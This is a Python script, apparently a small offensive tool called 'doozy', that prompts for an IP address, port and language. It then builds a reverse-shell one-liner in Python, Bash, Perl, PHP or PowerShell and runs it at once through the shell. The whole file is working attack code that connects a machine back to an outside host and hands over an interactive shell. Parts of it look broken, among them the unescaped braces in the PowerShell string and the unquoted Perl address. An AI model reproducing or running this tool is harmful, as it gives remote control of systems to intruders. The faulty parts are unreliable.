import socket
import subprocess
import pyfiglet

def doozy():
    ascii_art = pyfiglet.figlet_format("doozy")
    print(ascii_art)

doozy()

def get_reverse_shell(ip, port, language):
    if language == "python":
        return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    elif language == "bash":
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif language == "perl":
        return f"perl -e 'use Socket;$i={ip};$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    elif language == "php":
        return f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    elif language == "powershell":
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\", {port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    else:
        return None

ip = input("Enter the IP address: ")
port = input("Enter the port number: ")
language = input("Enter the language to use (python, bash, perl, php, powershell): ")

reverse_shell = get_reverse_shell(ip, port, language)

if reverse_shell:
    subprocess.run(reverse_shell, shell=True)
else:
    print("Invalid language selected")
